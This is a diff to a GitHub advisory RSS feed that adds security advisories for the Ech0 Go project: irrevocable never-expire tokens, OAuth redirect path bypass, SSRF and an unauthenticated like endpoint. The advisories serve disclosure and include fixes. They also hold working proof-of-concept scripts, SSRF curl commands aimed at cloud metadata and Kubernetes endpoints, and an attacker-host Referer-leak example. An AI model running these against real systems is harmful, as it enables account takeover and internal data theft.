@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-05-07T21:17:46.626Z</updated>
+    <updated>2026-05-07T22:19:37.632Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,683 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lin-snow/Ech0] ech0's acess tokens with expiry=never cannot be revoked: logout panics, delete does not blacklist JTI]]></title>
+        <id>https://github.com/advisories/GHSA-fpw6-hrg5-q5x5</id>
+        <link href="https://github.com/advisories/GHSA-fpw6-hrg5-q5x5"/>
+        <updated>2026-05-07T21:34:01.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Access tokens created with the "never expire" option have no <code>exp</code> JWT claim. Three independent revocation mechanisms fail for this token type. Logout at <code>internal/handler/auth/auth.go:154</code> and <code>:163</code> dereferences <code>claims.ExpiresAt.Time</code>, panicking on the nil field so the token never hits the blacklist. <code>RevokeToken</code> at <code>internal/repository/auth/auth.go:45-50</code> skips when <code>remainTTL &lt;= 0</code>. The admin's "Delete token" panel action at <code>internal/service/setting/access_token_service.go:183-185</code> removes the database record but does not call <code>RevokeToken</code> to blacklist the JTI. Once a never-expire token leaks, the JWT stays cryptographically valid until the admin rotates the signing key across the entire instance.</p>
+<h2 id="details">Details</h2>
+<p>Creation path at <code>internal/util/jwt/jwt.go:103-105</code>:</p>
+<pre><code class="language-go">// expiry = 0 表示永不过期
+if expiry &gt; 0 {
+    claims.ExpiresAt = jwt.NewNumericDate(time.Now().UTC().Add(time.Duration(expiry) * time.Second))
+}
+</code></pre>
+<p>For <code>NEVER_EXPIRY</code>, <code>expiry = 0</code> and the conditional skips. The resulting JWT has no <code>exp</code> claim. The middleware at <code>internal/middleware/auth.go</code> accepts it; the <code>jwt/v5</code> parser does not require <code>exp</code> by default.</p>
+<p>Failure mode 1, logout panic at <code>internal/handler/auth/auth.go:163</code>:</p>
+<pre><code class="language-go">// Refresh-token revocation at line 154 (safe in practice: refresh tokens always have exp).
+// Access-token revocation, same pattern, at line 163 (the bug):
+if claims, err := jwtUtil.ParseToken(authHeader[7:]); err == nil &amp;&amp; claims.ID != "" {
+    remaining := time.Until(claims.ExpiresAt.Time)  // nil deref when ExpiresAt is nil
+    h.authService.RevokeToken(claims.ID, remaining)
+}
+</code></pre>
+<p>For a never-expire access token, <code>claims.ExpiresAt</code> is nil. <code>claims.ExpiresAt.Time</code> panics. Gin's Recovery middleware catches it and returns HTTP 500; the JTI never reaches <code>RevokeToken</code>. Line 154 shares the same pattern against refresh tokens, but refresh tokens are always issued with an expiry so the nil dereference does not fire there in practice.</p>
+<p>Failure mode 2, <code>RevokeToken</code> skip at <code>internal/repository/auth/auth.go:45-50</code>:</p>
+<pre><code class="language-go">func (authRepository *AuthRepository) RevokeToken(jti string, remainTTL time.Duration) {
+    if jti == "" || remainTTL &lt;= 0 {
+        return
+    }
+    authRepository.cache.SetWithTTL(fmt.Sprintf("%s%s", blacklistPrefix, jti), true, 1, remainTTL)
+}
+</code></pre>
+<p>Even if the logout path were patched to handle nil <code>ExpiresAt</code>, a caller computing <code>remainTTL = 0</code> would still skip the blacklist write.</p>
+<p>Failure mode 3, admin delete at <code>internal/service/setting/access_token_service.go:183-185</code>:</p>
+<pre><code class="language-go">return settingService.transactor.Run(ctx, func(txCtx context.Context) error {
+    return settingService.settingRepository.DeleteAccessTokenByID(txCtx, id)
+})
+</code></pre>
+<p>Deletion removes the token's metadata row from the database. No call to <code>RevokeToken</code>, no write to the JTI blacklist. The JWT continues to validate because the signature is still authentic and the middleware does not consult the metadata table.</p>
+<p>The only way to invalidate a compromised never-expire token is to rotate <code>JWT_SECRET</code>, which invalidates every token for every user across the whole instance.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Default install. Admin creates a never-expire access token; its revocation pathways all fail:</p>
+<pre><code class="language-python">import requests, base64, json
+TARGET = "http://localhost:8300"
+
+owner = requests.post(f"{TARGET}/api/login",
+                      json={"username": "owner", "password": "owner-pw"}
+                     ).json()["data"]["access_token"]
+
+# 1) Create a never-expire access token.
+r = requests.post(f"{TARGET}/api/access-tokens",
+                  headers={"Authorization": f"Bearer {owner}",
+                           "content-type": "application/json"},
+                  json={"name": "poc-irrevocable",
+                        "expiry": "never",
+                        "scopes": ["profile:read"],
+                        "audience": "cli"})
+tok = r.json()["data"]
+pad = lambda s: s + "=" * (-len(s) % 4)
+payload = json.loads(base64.urlsafe_b64decode(pad(tok.split(".")[1])))
+print(f"  exp claim: {payload.get('exp')}  (None = never expires)")
+print(f"  jti: {payload['jti']}")
+
+# 2) Confirm it works.
+r = requests.get(f"{TARGET}/api/user", headers={"Authorization": f"Bearer {tok}"})
+print(f"  token -&gt; /api/user: HTTP {r.status_code}")
+
+# 3) Failure mode #1 — logout panics on nil ExpiresAt.
+r = requests.post(f"{TARGET}/api/auth/logout",
+                  headers={"Authorization": f"Bearer {tok}"})
+print(f"  logout: HTTP {r.status_code} (500 = Recovery middleware caught the panic)")
+
+# 4) Failure mode #3 — admin delete does not blacklist the JTI.
+listed = requests.get(f"{TARGET}/api/access-tokens",
+                      headers={"Authorization": f"Bearer {owner}"}).json()["data"]
+poc_row = next(t for t in listed if t["name"] == "poc-irrevocable")
+r = requests.delete(f"{TARGET}/api/access-tokens/{poc_row['id']}",
+                    headers={"Authorization": f"Bearer {owner}"})
+print(f"  admin delete: HTTP {r.status_code} {r.text}")
+
+# 5) Token should now be invalid if delete blacklisted. Test it.
+r = requests.get(f"{TARGET}/api/user", headers={"Authorization": f"Bearer {tok}"})
+print(f"  after delete, token -&gt; /api/user: HTTP {r.status_code}")
+print(f"  response body: {r.text[:150]}")
+</code></pre>
+<p>Observed on v4.5.6 in the test container:</p>
+<pre><code>exp claim: None  (None = never expires)
+jti: 019daf86-6354-7c2d-9ff1-180de87667b3
+token -&gt; /api/user: HTTP 200
+logout: HTTP 500 (500 = Recovery middleware caught the panic)
+admin delete: HTTP 200 {"code":1,"msg":"删除访问令牌成功","data":null}
+after delete, token -&gt; /api/user: HTTP 200
+response body: {"code":1,"msg":"获取用户信息成功","data":{"id":"019daf76-b5d2-7778-a90a-e943872b2946","username":"owner","email":"owner@test.local","is_admin":true,"is_owner":true,...}}
+</code></pre>
+<p>After the admin "deleted" the token, the same JWT string still returns the owner's profile data. The token stays valid with no path to invalidate it short of rotating <code>JWT_SECRET</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>The "never expire" option is intended for CLI and integration use cases where rotating tokens is expensive. When one of those tokens leaks (configuration file committed to a public repo, developer laptop compromised, log file uploaded by mistake), the admin has no remediation that does not nuke every other user's session.</p>
+<p>A compromised token gives the attacker:</p>
+<ul>
+<li><strong>Perpetual authenticated access</strong> at whatever scopes the token holds until the JWT secret is rotated.</li>
+<li><strong>Admin's "revoke" UI button lies.</strong> The token row disappears from the panel but the bearer keeps working. The admin believes they mitigated the incident.</li>
+<li><strong>Instance-wide blast radius on proper revocation.</strong> The only working fix (rotate JWT_SECRET) forces every user to log in again and invalidates every other access token. Security incidents force operators into an all-or-nothing choice.</li>
+</ul>
+<p>Precondition: token theft. A stolen token is the standard threat model for any long-lived credential; the point of revocation is that stolen credentials can be invalidated. Ech0 currently has no working path to do that for the "never expire" class.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Three coordinated changes, matching the three failure modes:</p>
+<ol>
+<li>Replace "never expire" with a very long expiry (for example 10 years) so every token has a finite <code>exp</code> claim. This removes the conditional at <code>jwt.go:103</code> entirely:</li>
+</ol>
+<pre><code class="language-go">if expiry == model.NEVER_EXPIRY {
+    expiry = int64((10 * 365 * 24 * time.Hour).Seconds())
+}
+claims.ExpiresAt = jwt.NewNumericDate(time.Now().UTC().Add(time.Duration(expiry) * time.Second))
+</code></pre>
+<ol start="2">
+<li>If the "never expire" semantics must be preserved, make logout handle nil <code>ExpiresAt</code> explicitly:</li>
+</ol>
+<pre><code class="language-go">if claims, err := jwtUtil.ParseToken(authHeader[7:]); err == nil &amp;&amp; claims.ID != "" {
+    var remaining time.Duration
+    if claims.ExpiresAt != nil {
+        remaining = time.Until(claims.ExpiresAt.Time)
+    } else {
+        remaining = 365 * 24 * time.Hour
+    }
+    h.authService.RevokeToken(claims.ID, remaining)
+}
+</code></pre>
+<p>And accept non-positive TTLs in <code>RevokeToken</code> by substituting a long default.</p>
+<ol start="3">
+<li>Blacklist the JTI when admin deletes an access token:</li>
+</ol>
+<pre><code class="language-go">tok, err := settingService.settingRepository.GetAccessTokenByID(ctx, id)
+if err != nil {
+    return err
+}
+if tok.JTI != "" {
+    settingService.authRepo.RevokeToken(tok.JTI, 365*24*time.Hour)
+}
+return settingService.transactor.Run(ctx, func(txCtx context.Context) error {
+    return settingService.settingRepository.DeleteAccessTokenByID(txCtx, id)
+})
+</code></pre>
+<p>Any two of the three changes close the gap; all three together make the revocation semantics match the admin's mental model.</p>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lin-snow/Ech0/security/advisories/GHSA-fpw6-hrg5-q5x5">https://github.com/lin-snow/Ech0/security/advisories/GHSA-fpw6-hrg5-q5x5</a></li>
+<li><a href="https://github.com/lin-snow/Ech0/commit/eab62379c795c3f4850a9ca938ae3f27d7171541">https://github.com/lin-snow/Ech0/commit/eab62379c795c3f4850a9ca938ae3f27d7171541</a></li>
+<li><a href="https://github.com/advisories/GHSA-fpw6-hrg5-q5x5">https://github.com/advisories/GHSA-fpw6-hrg5-q5x5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fpw6-hrg5-q5x5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-07T21:34:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lin-snow/Ech0] Ech0's OAuth redirect URI validation ignores path component, enables exchange-code theft]]></title>
+        <id>https://github.com/advisories/GHSA-p64j-f4x9-wq66</id>
+        <link href="https://github.com/advisories/GHSA-p64j-f4x9-wq66"/>
+        <updated>2026-05-07T21:30:46.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>parseAndValidateClientRedirect</code> at <code>internal/service/auth/auth.go:448</code> validates OAuth client-redirect URIs by comparing only scheme and host against the admin-configured allowlist. Path, query, and fragment are ignored. The initiator at <code>/oauth/:provider/login</code> embeds the caller-supplied <code>redirect_uri</code> verbatim into the signed state JWT without any validation at login time. Alice submits a crafted <code>redirect_uri</code> whose host matches an allowed origin but whose path points to any page on that host. After the provider exchange, Ech0 redirects the victim to the attacker-chosen path with the one-time exchange code in the query string. If the chosen path leaks the URL via Referer, analytics, or an open redirect, the attacker trades the code at <code>POST /api/auth/exchange</code> for the victim's access and refresh tokens. RFC 6749 §3.1.2 requires exact redirect URI matching.</p>
+<h2 id="details">Details</h2>
+<p>Validation at <code>internal/service/auth/auth.go:448</code>:</p>
+<pre><code class="language-go">matched := false
+for _, item := range allowed {
+    allowURL, parseErr := url.Parse(strings.TrimSpace(item))
+    if parseErr != nil || allowURL == nil || allowURL.Host == "" {
+        continue
+    }
+    if strings.EqualFold(redirectURL.Scheme, allowURL.Scheme) &amp;&amp;
+       strings.EqualFold(redirectURL.Host, allowURL.Host) {
+        matched = true
+        break
+    }
+}
+</code></pre>
+<p>Scheme and host compared via <code>EqualFold</code>. Path, query, fragment all ignored. An allowlist entry of <code>https://myecho.example.com/dashboard</code> matches every <code>https://myecho.example.com/&lt;anything&gt;</code> the attacker sends.</p>
+<p>Login flow at <code>internal/service/auth/auth.go:141</code> (<code>GetOAuthLoginURL</code>) and the handler at <code>internal/handler/auth/oauth.go:43</code>:</p>
+<pre><code class="language-go">redirectURI := ctx.Query("redirect_uri")
+redirectURL, err := h.authService.GetOAuthLoginURL(provider, redirectURI)
+// ...
+ctx.Redirect(302, redirectURL)
+</code></pre>
+<p>No validation at login. The raw <code>redirect_uri</code> query parameter is passed to <code>GetOAuthLoginURL</code>, which encodes it into the signed state JWT alongside the provider name and nonce. The state JWT travels through the OAuth provider and returns on the callback.</p>
+<p>At callback time, <code>parseAndValidateClientRedirect(oauthState.Redirect)</code> fires at <code>internal/service/auth/auth.go:372</code> and <code>:427</code> inside the callback handler chain. Scheme and host are the only gates on the attacker-chosen URI.</p>
+<p>After validation, the server generates a one-time exchange code and redirects the browser to the attacker-chosen path:</p>
+<pre><code>302 Location: https://myecho.example.com/&lt;attacker-path&gt;?code=&lt;one-time-exchange-code&gt;
+</code></pre>
+<p>The code is valid at the public endpoint <code>POST /api/auth/exchange</code> for up to 60 seconds (single-use). An attacker who reads the code from the URL trades it for the victim's access token and refresh token.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Default install with OAuth2 configured. Admin allows <code>https://myecho.example.com/dashboard</code> as the return URL; Alice sends a crafted login link whose redirect points elsewhere on the same host:</p>
+<pre><code class="language-python">import requests, urllib.parse, base64, json
+TARGET = "http://localhost:8300"
+
+# Admin setup: enable OAuth with one allowed return URL (dashboard).
+owner = requests.post(f"{TARGET}/api/login",
+                      json={"username": "owner", "password": "owner-pw"}
+                     ).json()["data"]["access_token"]
+requests.put(f"{TARGET}/api/oauth2/settings",
+             headers={"Authorization": f"Bearer {owner}",
+                      "content-type": "application/json"},
+             json={"enable": True, "provider": "github",
+                   "client_id": "poc-client-id", "client_secret": "poc-client-secret",
+                   "redirect_uri": f"{TARGET}/oauth/github/callback",
+                   "scopes": ["read:user"],
+                   "auth_url": "https://github.com/login/oauth/authorize",
+                   "token_url": "https://github.com/login/oauth/access_token",
+                   "user_info_url": "https://api.github.com/user",
+                   "auth_redirect_allowed_return_urls": ["https://myecho.example.com/dashboard"]})
+
+# Alice's link to the victim. Same host, different path.
+for attacker_uri in [
+    "https://myecho.example.com/dashboard",            # control, allowed
+    "https://myecho.example.com/attacker-chosen-path", # path bypass
+    "https://attacker.example/foo",                    # different host, should also fail
+]:
+    url = f"{TARGET}/oauth/github/login?redirect_uri=" + urllib.parse.quote(attacker_uri)
+    r = requests.get(url, allow_redirects=False)
+    loc = r.headers.get("Location", "")
+    state_jwt = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).get("state", [""])[0]
+    pad = lambda s: s + "=" * (-len(s) % 4)
+    payload = json.loads(base64.urlsafe_b64decode(pad(state_jwt.split(".")[1])))
+    print(f"  redirect_uri={attacker_uri!r}")
+    print(f"    login HTTP: {r.status_code}")
+    print(f"    state JWT redirect: {payload.get('redirect')!r}")
+</code></pre>
+<p>Observed on v4.5.6:</p>
+<pre><code>redirect_uri='https://myecho.example.com/dashboard'
+  login HTTP: 302
+  state JWT redirect: 'https://myecho.example.com/dashboard'
+redirect_uri='https://myecho.example.com/attacker-chosen-path'
+  login HTTP: 302
+  state JWT redirect: 'https://myecho.example.com/attacker-chosen-path'
+redirect_uri='https://attacker.example/foo'
+  login HTTP: 302
+  state JWT redirect: 'https://attacker.example/foo'
+</code></pre>
+<p>All three <code>redirect_uri</code> values sail through login with no validation; the state JWT carries the attacker-chosen URL verbatim. The first two pass the callback's scheme+host check against the <code>dashboard</code> allowlist entry and the server redirects to the attacker-chosen path with the exchange code appended. The third (different host) fails the callback's allowlist check, so it does not land; the point is that no validation occurs at login time, only at callback, and the callback check ignores path entirely.</p>
+<h2 id="impact">Impact</h2>
+<p>Alice delivers a single link to Bob (phishing email, social-engineering message, embedded redirect in a compromised site). Bob clicks, completes OAuth as himself, and lands on the attacker-chosen path on the legitimate Ech0 host with <code>?code=&lt;one-time&gt;</code> in the URL. Three paths to full account takeover follow:</p>
+<ul>
+<li><strong>Referer leakage.</strong> A single <code>&lt;img src="https://attacker.site/log"&gt;</code> or <code>&lt;script src&gt;</code> on the attacker-chosen path sends the victim's full URL (including the code) to the attacker in the Referer header.</li>
+<li><strong>Analytics and third-party scripts.</strong> Any page on the allowlisted host that loads Google Analytics, Sentry, or Segment reports the URL (including the code) to those services. Any attacker with access to those accounts reads the code.</li>
+<li><strong>Open-redirect chains.</strong> If any path on the allowlisted host has an open-redirect bug, the attacker targets it and bounces the URL (with the code) to their server.</li>
+</ul>
+<p>The code is trade-in-able at <code>POST /api/auth/exchange</code>, which is public. The exchange returns the victim's access_token and refresh_token. Full account takeover follows.</p>
+<p>Preconditions: Ech0's OAuth is configured (opt-in), one allowlisted host has any path that leaks URLs, and the attacker reaches the victim with a crafted link. RFC 6749 §3.1.2 exists precisely to prevent this chain.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Require exact redirect URI matching per the spec. Compare scheme, host, and path together:</p>
+<pre><code class="language-go">redirectNorm := strings.ToLower(redirectURL.Scheme) + "://" +
+                strings.ToLower(redirectURL.Host) +
+                redirectURL.Path
+for _, item := range allowed {
+    allowURL, parseErr := url.Parse(strings.TrimSpace(item))
+    if parseErr != nil || allowURL == nil || allowURL.Host == "" {
+        continue
+    }
+    allowNorm := strings.ToLower(allowURL.Scheme) + "://" +
+                 strings.ToLower(allowURL.Host) +
+                 allowURL.Path
+    if redirectNorm == allowNorm {
+        matched = true
+        break
+    }
+}
+</code></pre>
+<p>Validate the <code>redirect_uri</code> at login time too, so a malformed value never enters the state JWT:</p>
+<pre><code class="language-go">func (s *AuthService) GetOAuthLoginURL(provider, redirectURI string) (string, error) {
+    if redirectURI != "" {
+        if _, err := s.parseAndValidateClientRedirect(redirectURI); err != nil {
+            return "", err
+        }
+    }
+    // ... rest unchanged
+}
+</code></pre>
+<p>Document the exact-match semantics in the admin panel. Every allowlisted return URL needs the full path the front-end lands on.</p>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lin-snow/Ech0/security/advisories/GHSA-p64j-f4x9-wq66">https://github.com/lin-snow/Ech0/security/advisories/GHSA-p64j-f4x9-wq66</a></li>
+<li><a href="https://github.com/lin-snow/Ech0/commit/a7e8b8e84bd1e3db090dfb720f2c6c433356b442">https://github.com/lin-snow/Ech0/commit/a7e8b8e84bd1e3db090dfb720f2c6c433356b442</a></li>
+<li><a href="https://github.com/advisories/GHSA-p64j-f4x9-wq66">https://github.com/advisories/GHSA-p64j-f4x9-wq66</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p64j-f4x9-wq66</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-07T21:30:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lin-snow/ech0] Ech0 has Server-Side Request Forgery (SSRF) via Connect Handler fetchPeerConnectInfo]]></title>
+        <id>https://github.com/advisories/GHSA-8mc6-xjpr-h98x</id>
+        <link href="https://github.com/advisories/GHSA-8mc6-xjpr-h98x"/>
+        <updated>2026-05-07T21:28:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>fetchPeerConnectInfo</code> function in <code>internal/service/connect/connect.go:214-239</code> uses <code>httpUtil.SendRequest</code> (no SSRF protection) instead of <code>SendSafeRequest</code> (which has <code>ValidatePublicHTTPURL</code> with private IP blocking). This allows authenticated users to make the server request arbitrary URLs including internal/cloud metadata endpoints.</p>
+<h2 id="details">Details</h2>
+<p>In <code>internal/service/connect/connect.go</code>, the <code>fetchPeerConnectInfo</code> function:</p>
+<pre><code class="language-go">func fetchPeerConnectInfo(peerConnectURL string, requestTimeout time.Duration) (model.Connect, error) {
+    url := httpUtil.TrimURL(peerConnectURL) + "/api/connect"
+    resp, err := httpUtil.SendRequest(url, "GET", struct {...}{...}, requestTimeout)
+</code></pre>
+<p>This uses <code>SendRequest</code> which has NO URL validation. The codebase HAS <code>SendSafeRequest</code> at <code>internal/util/http/http.go:228-281</code> with proper SSRF protection, but <code>fetchPeerConnectInfo</code> does not use it.</p>
+<p>Called from:</p>
+<ul>
+<li>Line 307: <code>data, err := fetchPeerConnectInfo(conn.ConnectURL, requestTimeout)</code></li>
+<li><ul>
+<li>Line 498: <code>data, err := fetchPeerConnectInfo(conn.ConnectURL, healthProbeTimeout)</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># 1. Add a connection pointing to AWS metadata service
+curl -X POST "https://ech0.example.com/api/connects" \
+  -H "Authorization: Bearer &lt;token&gt;" \
+  -d '{"connect_url": "http://169.254.169.254/latest/meta-data/instance-id"}'
+
+# 2. Trigger SSRF via health check
+curl -H "Authorization: Bearer &lt;token&gt;" \
+  "https://ech0.example.com/api/connects/health"
+# Returns AWS EC2 instance ID
+</code></pre>
+<p>Or for Kubernetes:</p>
+<pre><code class="language-bash">curl -X POST "https://ech0.example.com/api/connects" \
+  -H "Authorization: Bearer &lt;token&gt;" \
+  -d '{"connect_url": "http://kubernetes.default.svc.cluster.local:443/api"}'
+</code></pre>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Confidentiality</strong>: SSRF can access internal services, cloud metadata (AWS IMDSv1, GCE metadata), Kubernetes API</li>
+<li><ul>
+<li><strong>CWE-918</strong>: Server-Side Request Forgery</li>
+</ul>
+</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lin-snow/Ech0/security/advisories/GHSA-8mc6-xjpr-h98x">https://github.com/lin-snow/Ech0/security/advisories/GHSA-8mc6-xjpr-h98x</a></li>
+<li><a href="https://github.com/lin-snow/Ech0/commit/091d26d2d942df6df9f520328d2f9cf2592bbefc">https://github.com/lin-snow/Ech0/commit/091d26d2d942df6df9f520328d2f9cf2592bbefc</a></li>
+<li><a href="https://github.com/advisories/GHSA-8mc6-xjpr-h98x">https://github.com/advisories/GHSA-8mc6-xjpr-h98x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8mc6-xjpr-h98x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-07T21:28:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lin-snow/Ech0] Ech0 allows PUT /api/echo/like/:id unauthenticated: anonymous callers to modify any echo's fav_count]]></title>
+        <id>https://github.com/advisories/GHSA-pj6q-4vq4-r8cg</id>
+        <link href="https://github.com/advisories/GHSA-pj6q-4vq4-r8cg"/>
+        <updated>2026-05-07T21:23:57.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>PUT /api/echo/like/:id</code> at <code>internal/router/echo.go:12</code> is registered on <code>PublicRouterGroup</code> with no authentication and no rate limit. Anonymous callers increment the <code>fav_count</code> counter on any echo (including private echoes) by UUID, repeat the request without deduplication, and trigger a database write plus a four-key cache invalidation on every call. Alice harvests echo UUIDs from the public <code>GET /api/echo/page</code> response, inflates fav counts at will, and spams writes to amplify load on the DB and cache layers.</p>
+<h2 id="details">Details</h2>
+<p>Route registration at <code>internal/router/echo.go:12</code>:</p>
+<pre><code class="language-go">appRouterGroup.PublicRouterGroup.PUT("/echo/like/:id", h.EchoHandler.LikeEcho())
+</code></pre>
+<p><code>PublicRouterGroup</code> is <code>r.Group("/api")</code> without the JWT middleware that <code>AuthRouterGroup</code> applies. The handler passes through to <code>EchoService.LikeEcho</code>, which calls <code>EchoRepository.LikeEcho</code> at <code>internal/repository/echo/echo.go:270</code>:</p>
+<pre><code class="language-go">func (echoRepository *EchoRepository) LikeEcho(ctx context.Context, id string) error {
+    var exists bool
+    if err := echoRepository.getDB(ctx).Model(&amp;model.Echo{}).
+        Select("count(*) &gt; 0").Where("id = ?", id).Find(&amp;exists).Error; err != nil {
+        return err
+    }
+    if !exists {
+        return errors.New(commonModel.ECHO_NOT_FOUND)
+    }
+    if err := echoRepository.getDB(ctx).Model(&amp;model.Echo{}).
+        Where("id = ?", id).
+        UpdateColumn("fav_count", gorm.Expr("fav_count + ?", 1)).Error; err != nil {
+        return err
+    }
+    return nil
+}
+</code></pre>
+<p>No viewer check, no ownership check, no private-flag check. Compare the read path at <code>EchoService.GetEchoById</code> (<code>internal/service/echo/echo.go:275-300</code>) which rejects anonymous readers on private echoes; the like path skips that gate. <code>InvalidateEchoCaches</code> (<code>internal/repository/echo/echo.go:51-58</code>) clears the page cache, today cache, RSS cache, and per-echo cache on every like. Comment creation on the same router group runs behind <code>checkRateLimit</code> (<code>internal/service/comment/comment.go:731-766</code>, 3 per 60 s per IP plus 20 per 3600 s); the like endpoint has no such middleware.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Default install, anonymous caller on the network:</p>
+<pre><code class="language-python">import requests
+TARGET = "http://localhost:8300"
+
+# 1) Discover an echo UUID from the public feed (no auth).
+page = requests.get(f"{TARGET}/api/echo/page?page=1&amp;pageSize=1").json()
+echo_id = page["data"]["items"][0]["id"]
+
+# 2) Like it. Repeat without deduplication.
+for i in range(3):
+    r = requests.put(f"{TARGET}/api/echo/like/{echo_id}")
+    print(f"public like #{i+1}: HTTP {r.status_code} {r.text}")
+
+# 3) Like a private echo by UUID. Private echoes never appear in /api/echo/page,
+#    but the UUID arrives via other channels (logs, referer, shared drafts).
+private_id = "019daf77-4a97-7c4c-a63c-791b10ecfd0b"  # admin-created private echo
+r = requests.put(f"{TARGET}/api/echo/like/{private_id}")
+print(f"private like: HTTP {r.status_code} {r.text}")
+</code></pre>
+<p>Observed on v4.5.6 in the test container:</p>
+<pre><code>public like #1: HTTP 200 {"code":1,"msg":"点赞Echo成功","data":null}
+public like #2: HTTP 200 {"code":1,"msg":"点赞Echo成功","data":null}
+public like #3: HTTP 200 {"code":1,"msg":"点赞Echo成功","data":null}
+private like: HTTP 200 {"code":1,"msg":"点赞Echo成功","data":null}
+</code></pre>
+<p>The same IP likes the same echo three times without 429 or dedup. The private-echo like (UUID <code>019daf77-4a97...</code>) succeeded even though <code>GetEchosById</code> would refuse to read that echo for an anonymous caller.</p>
+<h2 id="impact">Impact</h2>
+<p>Anonymous, rate-limit-free writes against any echo's <code>fav_count</code>. Direct impact:</p>
+<ul>
+<li><strong>Popularity signal destruction.</strong> fav_count powers the <code>hot</code> feed; a single script skews the ranking at will.</li>
+<li><strong>Private-boundary bypass.</strong> Private-flagged echoes remain non-readable, but they accept likes from anyone who knows the UUID. UUIDs leak through logs, referer headers on shared drafts, and the owner's browser history.</li>
+<li><strong>Server and cache load.</strong> Every call triggers a SQLite <code>UPDATE</code> transaction plus four cache-key invalidations. A single attacker from one IP drives sustained writes and forces cache stampedes for every concurrent reader.</li>
+</ul>
+<p>Reachability is anonymous. No credentials, no tokens, no session. Every Ech0 deployment that exposes port 6277 is reachable.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Move the route to <code>AuthRouterGroup</code> so JWT middleware applies, add a per-user dedup gate, and rate-limit at the middleware layer:</p>
+<pre><code class="language-go">appRouterGroup.AuthRouterGroup.PUT(
+    "/echo/like/:id",
+    middleware.RateLimit(5, 10),
+    h.EchoHandler.LikeEcho(),
+)
+</code></pre>
+<p>At the service layer, check the private flag and record the user/echo pair in a join table to prevent repeat increments from the same user:</p>
+<pre><code class="language-go">func (s *EchoService) LikeEcho(ctx context.Context, id string) error {
+    userID := viewer.MustFromContext(ctx).UserID()
+    if userID == "" {
+        return errors.New(commonModel.NO_PERMISSION_DENIED)
+    }
+    echo, err := s.echoRepository.GetEchosById(ctx, id)
+    if err != nil || echo == nil {
+        return errors.New(commonModel.ECHO_NOT_FOUND)
+    }
+    if echo.Private {
+        user, err := s.commonService.CommonGetUserByUserId(ctx, userID)
+        if err != nil || !user.IsAdmin {
+            return errors.New(commonModel.NO_PERMISSION_DENIED)
+        }
+    }
+    return s.echoRepository.LikeEchoOnce(ctx, id, userID)
+}
+</code></pre>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lin-snow/Ech0/security/advisories/GHSA-pj6q-4vq4-r8cg">https://github.com/lin-snow/Ech0/security/advisories/GHSA-pj6q-4vq4-r8cg</a></li>
+<li><a href="https://github.com/lin-snow/Ech0/commit/cecc2c19b590df85d79ea98457faa143130cd620">https://github.com/lin-snow/Ech0/commit/cecc2c19b590df85d79ea98457faa143130cd620</a></li>
+<li><a href="https://github.com/advisories/GHSA-pj6q-4vq4-r8cg">https://github.com/advisories/GHSA-pj6q-4vq4-r8cg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pj6q-4vq4-r8cg</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-07T21:23:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lin-snow/ech0] Ech0's Unauthenticated Like Endpoint Enables Arbitrary Engagement Metric Inflation]]></title>
+        <id>https://github.com/advisories/GHSA-rgj7-vg8v-j4wr</id>
+        <link href="https://github.com/advisories/GHSA-rgj7-vg8v-j4wr"/>
+        <updated>2026-05-07T21:21:21.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
